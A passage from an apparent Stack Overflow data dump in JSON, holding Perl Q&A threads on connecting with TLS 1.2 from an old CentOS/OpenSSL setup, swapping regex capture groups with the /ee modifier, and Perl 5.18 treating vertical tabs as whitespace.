newer version of OpenSSL. Just installing the default  RPM will not help since it is linked against the older OpenSSL version.</p>\n\n<p>This means you need to install the module manually and also take care that you link it against the newer OpenSSL library. For Net::SSLeay this means to set the correct OPENSSL_PREFIX to the new version of OpenSSL as documented in <a href=\"https://metacpan.org/source/MIKEM/Net-SSLeay-1.84/README\" rel=\"nofollow noreferrer\">the README of Net::SSLeay</a>.</p>\n\n<p>I also recommend to use a newer version of LWP and IO::Socket::SSL because TLS 1.2 is usually not the only problem you face. Other problems might be that the server requires SNI. And, I advice against replacing your system Perl modules since this might cause problems with other programs. Instead use perlbrew or similar to install your own Perl different from system Perl and use this with updated modules for your specific needs.</p>\n"}], "owner": {"reputation": 13, "user_id": 8341986, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3463dbc4b8c79f9073bccd46a49114d2?s=128&d=identicon&r=PG&f=1", "display_name": "goodyone", "link": "https://stackoverflow.com/users/8341986/goodyone"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1702, "favorite_count": 0, "accepted_answer_id": 49166945, "answer_count": 1, "score": 0, "last_activity_date": 1520491371, "creation_date": 1520490595, "question_id": 49166769, "link": "https://stackoverflow.com/questions/49166769/using-perl-5-8-8-with-openssl-1-0-1-to-connect-with-tlsv1-2", "title": "Using perl 5.8.8 with OpenSSL 1.0.1 to connect with TLSv1.2", "body": "<p>I am working on perl script that connects to server that supports TLSv1.2. At present I am not able to connect because perl is running on CentOS 5.4 with OpenSSL version 0.9.8e. I don't want to upgrade perl because it might break the script since there have been changes and latest version of perl is 5.26 which is way too latest. Now, I can run the script on different Windows box with no problems that is using perl 5.24. my question, can I use openssl 1.0.1 on CentOS 5.x and recompile perl modules and be still able to connect to TLV1.2? \nI have already installed modules mentioned in <a href=\"https://stackoverflow.com/questions/32581367/lwpuseragent-and-500-ssl-negotiation-failed\">LWP::UserAgent and 500 SSL negotiation failed</a> except openssl. I also followed <a href=\"https://miteshshah.github.io/linux/centos/how-to-enable-openssl-1-0-2-a-tlsv1-1-and-tlsv1-2-on-centos-5-and-rhel5/\" rel=\"nofollow noreferrer\">https://miteshshah.github.io/linux/centos/how-to-enable-openssl-1-0-2-a-tlsv1-1-and-tlsv1-2-on-centos-5-and-rhel5/</a> to install openssl but when I do openssl version I still see the original version i.e. 0.9.9e. </p>\n\n<p>In the above link it mentioned to use CPAN to update/install perl modules. Instead of that I got the rpm for perl modules and installed. </p>\n\n<p>LWP on server is 5.834.</p>\n\n<p>I know ideal way would be to go for CentOS 6 or later but is there a better approach to get this working?</p>\n"}, {"tags": ["perl", "substitution"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1520493617, "post_id": 49166149, "comment_id": 85340022, "body": "What&#39;s wrong with <code>perl -wE&#39;$_=q(abxy); s&#47;([ab]+)([xy]+)&#47;$2$1&#47;; say&#39;</code>?"}, {"owner": {"reputation": 53, "user_id": 1234700, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/40224b0530531d33279a7d9d3c8ccd8b?s=128&d=identicon&r=PG", "display_name": "user1234700", "link": "https://stackoverflow.com/users/1234700/user1234700"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1520497437, "post_id": 49166149, "comment_id": 85341979, "body": "I believe if im reading your command correctly, that its only looking to swap characters that are next to each other, which is a subset of my problem."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1520497982, "post_id": 49166149, "comment_id": 85342273, "body": "It&#39;s just a simple example, of swapping the capture groups. It is not clear to me what the problem is -- you state that you want to swap individual characters inside a capture group (of only two chars), but the (only) answer assumes that you in fact mean two capture groups and you didn&#39;t correct that in the comment. I&#39;d suggest that you edit the question with an example of an input string and what the output should be."}, {"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 0, "creation_date": 1520503371, "post_id": 49166149, "comment_id": 85345752, "body": "@user1234700: <i>&quot;swap characters that are next to each other ... is a subset of my problem&quot;</i> Well, I answered the question you asked, if your requirements are broader you need to say so in the question. See also <a href=\"https://stackoverflow.com/help/mcve\">MCVE</a>."}, {"owner": {"reputation": 53, "user_id": 1234700, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/40224b0530531d33279a7d9d3c8ccd8b?s=128&d=identicon&r=PG", "display_name": "user1234700", "link": "https://stackoverflow.com/users/1234700/user1234700"}, "edited": false, "score": 0, "creation_date": 1520563932, "post_id": 49166149, "comment_id": 85377285, "body": "I have added better clarification to my entire problem, my mistake."}], "answers": [{"comments": [{"owner": {"reputation": 53, "user_id": 1234700, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/40224b0530531d33279a7d9d3c8ccd8b?s=128&d=identicon&r=PG", "display_name": "user1234700", "link": "https://stackoverflow.com/users/1234700/user1234700"}, "edited": false, "score": 0, "creation_date": 1520494138, "post_id": 49166296, "comment_id": 85340277, "body": "I think what I was missing was the /ee modifier. After having added it, im getting a &quot;Scalar found where operator expected&quot; with iterating evals. Apparently this is expected behavior. Do I need to add a &#39;.&#39; or replace the $ with \\ (\\2.\\1) in order to fix this?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1520497216, "post_id": 49166296, "comment_id": 85341850, "body": "I don&#39;t see why you need <code>&#47;ee</code>.  Isn&#39;t <code>s&#47;(.)(.)&#47;$2$1&#47;</code> (swaps captures) what is needed?"}, {"owner": {"reputation": 53, "user_id": 1234700, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/40224b0530531d33279a7d9d3c8ccd8b?s=128&d=identicon&r=PG", "display_name": "user1234700", "link": "https://stackoverflow.com/users/1234700/user1234700"}, "edited": false, "score": 0, "creation_date": 1520497549, "post_id": 49166296, "comment_id": 85342042, "body": "The problem itself is tricky. Here is the way I understand it:  If the input contains ([aeiou])([aeiou]) then swap the characters $2$1.  If the input is some word, then swap every character &#39;e&#39; with &#39;@&#39;.  I dont know how to separate these two cases. Im given test cases where both of these scenarios exist, so the output is coming out wrong.  I feel as though Perl has the capability to do both with one command but I think im missing something."}, {"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "reply_to_user": {"reputation": 53, "user_id": 1234700, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/40224b0530531d33279a7d9d3c8ccd8b?s=128&d=identicon&r=PG", "display_name": "user1234700", "link": "https://stackoverflow.com/users/1234700/user1234700"}, "edited": false, "score": 0, "creation_date": 1520503464, "post_id": 49166296, "comment_id": 85345806, "body": "@user1234700: <i>&quot;Do I need to add a &#39;.&#39;&quot;</i> I already answered that above! <code>eval</code> needs valid Perl source code, <code>$2$1</code> would not be valid Perl - <code>&quot;$2$1&quot;</code> or <code>$2.$1</code> would be."}, {"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1520503564, "post_id": 49166296, "comment_id": 85345877, "body": "@zdim: The way I understood the question was that both the search and replacement part are coming from strings; in the code shown it&#39;s <code>s&#47;$ARGV[0]&#47;$ARGV[1]&#47;ig</code>."}, {"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "reply_to_user": {"reputation": 53, "user_id": 1234700, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/40224b0530531d33279a7d9d3c8ccd8b?s=128&d=identicon&r=PG", "display_name": "user1234700", "link": "https://stackoverflow.com/users/1234700/user1234700"}, "edited": false, "score": 0, "creation_date": 1520503829, "post_id": 49166296, "comment_id": 85346035, "body": "@user1234700: <i>&quot;then swap every character &#39;e&#39; with &#39;@&#39;&quot;</i> This is another new requirement that you didn&#39;t state in the question, so of course we can&#39;t help you with it (yet)! <i>&quot;I feel as though Perl has the capability to do both with one command&quot;</i> Probably, but if you want help with that you&#39;ll have to ask properly, meaning giving all the requirements, sample inputs with expected outputs, the code you tried, etc., in the question."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1520532476, "post_id": 49166296, "comment_id": 85364805, "body": "Sure, and the question is rather unclear and your take is reasonable. Still, there is no need for <code>&#47;ee</code> in order to just swap captures -- <code>s&#47;..&#47;$2.$1&#47;ee</code> is the same as <code>s&#47;..&#47;$2$1&#47;</code> (unless a capture contains a variable name like <code>$x</code>, or code, which need be evaluated)."}], "tags": [], "owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "is_accepted": false, "score": 4, "last_activity_date": 1520488981, "last_edit_date": 1520488981, "creation_date": 1520488237, "answer_id": 49166296, "question_id": 49166149, "link": "https://stackoverflow.com/questions/49166149/need-2-and-1-to-be-interpreted-using-substitution/49166296#49166296", "title": "Need $2 and $1 to be interpreted using substitution", "body": "<p>In the regex <code>([aeiou][aeiou])</code>, you only have one capture group, so <code>$2</code> will not contain anything, you probably meant <code>([aeiou])([aeiou])</code>.</p>\n\n<p>As for having the replacement be interpreted as code, you could use the <a href=\"http://perldoc.perl.org/perlop.html#s/_PATTERN_/_REPLACEMENT_/msixpodualngcer\" rel=\"nofollow noreferrer\"><code>/ee</code> modifier</a>, which means \"evaluate the right side as a string, then <a href=\"http://perldoc.perl.org/functions/eval.html\" rel=\"nofollow noreferrer\">eval</a> the result.\" One thing to be careful with is that <code>eval</code> allows for the execution of arbitrary code, so as long as this is just a lab exercise it's fine, but it's something to be very careful with in a multi-user environment.\n(I'd apply a similar warning to user-supplied regexes, even if the execution of user-supplied code is normally <a href=\"http://perldoc.perl.org/re.html#&#39;eval&#39;-mode\" rel=\"nofollow noreferrer\">restricted</a> there.)</p>\n\n<p>Because the string in the replacement will be evaluated as a Perl expression, we need to add the dot concatenation operator between the two strings, since <code>$2$1</code> would not be valid.</p>\n\n<pre><code>use warnings;\nuse strict;\nmy $regex = '([aeiou])([aeiou])';\nmy $subst = '$2.$1';\nmy $str = 'xeOyAuz';\n$str =~ s/$regex/$subst/eeig;\nprint \"&lt;$str&gt;\\n\";                  # prints \"&lt;xOeyuAz&gt;\"\n</code></pre>\n"}], "owner": {"reputation": 53, "user_id": 1234700, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/40224b0530531d33279a7d9d3c8ccd8b?s=128&d=identicon&r=PG", "display_name": "user1234700", "link": "https://stackoverflow.com/users/1234700/user1234700"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 127, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1520567559, "creation_date": 1520487463, "last_edit_date": 1520567559, "question_id": 49166149, "link": "https://stackoverflow.com/questions/49166149/need-2-and-1-to-be-interpreted-using-substitution", "title": "Need $2 and $1 to be interpreted using substitution", "body": "<p>So my problem is that im trying to replace all occurrences of a certain character to another character.</p>\n\n<p>It is used like so: \"Usage: ./swap.pl 'input' 'output'\";</p>\n\n<p>Where input is the string to change all occurrences of and output is the character it is being changed to.</p>\n\n<p>My script needs to be able to recognize regex as well.</p>\n\n<p>The problem occurs with this case ([aeiou][aeiou]) to '$2$1' Meaning flip the characters in the capture group. </p>\n\n<p>Ive tried:</p>\n\n<p>1.Pulling out the string, splitting it and changing their positions, but it saves the first occurrence and uses it for the rest of the matches instead of updating every time.</p>\n\n<ol start=\"2\">\n<li><p>Using a substitution (s///) but it doesn't interpret the $1$2 as their values. Apparently there is a eval(qq{}) expression I can use, but it doesn't seem to work in the substitution operator.</p></li>\n<li><p>Using tr//; but that didn't really do anything.</p></li>\n<li><p>I tried to evaluate the string, then create a new string by saving the characters in the swapped order but that didn't seem to work either. </p></li>\n</ol>\n\n<p>Im kind of stuck and dont know how to proceed. Any ideas?</p>\n\n<p>Here is my code:</p>\n\n<pre><code>my $size = $#ARGV + 1;\nif ($size != 2)\n{\n        print STDERR \"Usage: ./swap.pl 'input' 'output'\";\n        exit 1;\n}\n\nwhile(&lt;STDIN&gt;)\n{\n\n        $_ =~ s/$ARGV[0]/$ARGV[1]/ig;\n        print $_;\n\n}\n</code></pre>\n\n<p>Most cases work great:</p>\n\n<p>\"Isaac Newton and the Apple | \"./swap.pl 'p' 'q'\" would output \"Isaac Newton and the Aqqle\"</p>\n\n<p>But cases like ([l])([e]) are being treated as;</p>\n\n<p>\"Isaac Newton and the Apple | \"./swap.pl '([l])([e])' '$2$1'\" would output \"Isaac Newton and the App$2$1\" Whereas it should output \"Isaac Newton and the Appel\"</p>\n\n<p>EDIT2:\nI tried going back to #2 and that command seems to be working, however it only captures the first capture group and stores it whereas I need it to capture every new occurring group.</p>\n\n<p>EDIT3:</p>\n\n<p>After grueling over it a bit, I figured it out! Capture groups mean different things depending on where you use them. If I used them in an if statement, they just capture the first group and remain the same</p>\n\n<p>If used in a substitution however, the capture group updates every time you encounter a match. I just checked to see if the input was a regex.  </p>\n"}, {"tags": ["perl"], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 7, "last_activity_date": 1520527987, "last_edit_date": 1592644375, "creation_date": 1520474547, "answer_id": 49164216, "question_id": 49164191, "link": "https://stackoverflow.com/questions/49164191/differing-treatment-of-vertical-tabs-by-different-perls/49164216#49164216", "title": "differing treatment of vertical tabs by different Perls", "body": "<p>Since 5.18, <a href=\"http://perldoc.perl.org/perl5180delta.html#Vertical-tabs-are-now-whitespace\" rel=\"noreferrer\">vertical tabs are considered whitespace</a>.</p>\n<blockquote>\n<p>No one could recall why <code>\\s</code> didn't match <code>\\cK</code>, the vertical tab. Now it does. Given the extreme rarity of that character, very little breakage is expected. That said, here's what it means:</p>\n<p><code>\\s</code> in a regex now matches a vertical tab in all circumstances.</p>\n<p>Literal vertical tabs in a regex literal are ignored when the <code>/x</code> modifier is used.</p>\n<p>Leading vertical tabs, alone or mixed with other whitespace, are now ignored when interpreting a string as a number. For example:</p>\n<pre><code>$dec = &quot; \\cK \\t 123&quot;;\n$hex = &quot; \\cK \\t 0xF&quot;;\nsay 0 + $dec;   # was 0 with warning, now 123\nsay int $dec;   # was 0, now 123\nsay oct $hex;   # was 0, now  15\n</code></pre>\n</blockquote>\n<p>This brings Perl in line with <a href=\"ftp://ftp.unicode.org/Public/UNIDATA/PropList.txt\" rel=\"noreferrer\">Unicode</a>, which considers U+000B LINE TABULATION aka VERTICAL TABULATION aka VT a <code>White_Space</code> character.</p>\n<hr />\n<p>You can get back the old behaviour by replacing <code>\\s</code> with <code>[^\\S\\x0B]</code>.</p>\n<p>Also worth considering is <code>\\h</code>, which matches only horizontal whitespace characters.</p>\n<pre class=\"lang-none prettyprint-override\"><code>U+0009 CHARACTER TABULATION        Matched by \\s &amp; \\h\nU+000A LINE FEED                   Matched by \\s &amp; \\v\nU+000B LINE TABULATION             Matched by \\s &amp; \\v\nU+000C FORM FEED                   Matched by \\s &amp; \\v\nU+000D CARRIAGE RETURN             Matched by \\s &amp; \\v\nU+0020 SPACE                       Matched by \\s &amp; \\h\nU+0085 NEXT LINE                   Matched by \\s &amp; \\v\nU+00A0 NO-BREAK SPACE              Matched by \\s &amp; \\h\nU+1680 OGHAM SPACE MARK            Matched by \\s &amp; \\h\nU+2000 EN QUAD                     Matched by \\s &amp; \\h\nU+2001 EM QUAD                     Matched by \\s &amp; \\h\nU+2002 EN SPACE                    Matched by \\s &amp; \\h\nU+2003 EM SPACE                    Matched by \\s &amp; \\h\nU+2004 THREE-PER-EM SPACE          Matched by \\s &amp; \\h\nU+2005 FOUR-PER-EM SPACE           Matched by \\s &amp; \\h\nU+2006 SIX-PER-EM SPACE            Matched by \\s &amp; \\h\nU+2007 FIGURE SPACE                Matched by \\s &amp; \\h\nU+2008 PUNCTUATION SPACE           Matched by \\s &amp; \\h\nU+2009 THIN SPACE                  Matched by \\s &amp; \\h\nU+200A HAIR SPACE                  Matched by \\s &amp; \\h\nU+2028 LINE SEPARATOR              Matched by \\s &amp; \\v\nU+2029 PARAGRAPH SEPARATOR         Matched by \\s &amp; \\v\nU+202F NARROW NO-BREAK SPACE       Matched by \\s &amp; \\h\nU+205F MEDIUM MATHEMATICAL SPACE   Matched by \\s &amp; \\h\nU+3000 IDEOGRAPHIC SPACE           Matched by \\s &amp; \\h\n</code></pre>\n"}], "owner": {"reputation": 5937, "user_id": 783314, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/b3d5692064779f501f7c2a639dc0076c?s=128&d=identicon&r=PG", "display_name": "Stephen", "link": "https://stackoverflow.com/users/783314/stephen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 60, "favorite_count": 1, "answer_count": 1, "score": 2, "last_activity_date": 1520527987, "creation_date": 1520474396, "question_id": 49164191, "link": "https://stackoverflow.com/questions/49164191/differing-treatment-of-vertical-tabs-by-different-perls", "title": "differing treatment of vertical tabs by different Perls", "body": "<p>I have two Perl programs that use identical libraries to process documents. They are installed on two different servers, and one runs Perl 5.12 while the other runs Perl 5.18.</p>\n\n<p>Right now I am feeding the same files as input to both, so I can diff the output to make sure they match. I got hundreds of identical matches. They're normally processing UTF-8 files, and I've taken care to handle that encoding correctly.</p>\n\n<p>Today they both received a binary file, and for the first time I saw a difference. I determined that one program (the one running Perl 5.18) stripped vertical tabs from the content of the file before outputting it, while the other program did not.</p>\n\n<p>I could just write this off as not supporting binary files, but it still bothers me that they are different. I looked into the library doing the processing, and it contains this line (it will process every line in the file this way):</p>\n\n<pre><code>$line =~ s/\\s//g;\n</code></pre>\n\n<p>Is it possible that one of the Perls thinks vertical tabs are spaces, while the other does not? How would I check that? Anything else you think I should look into?</p>\n"}]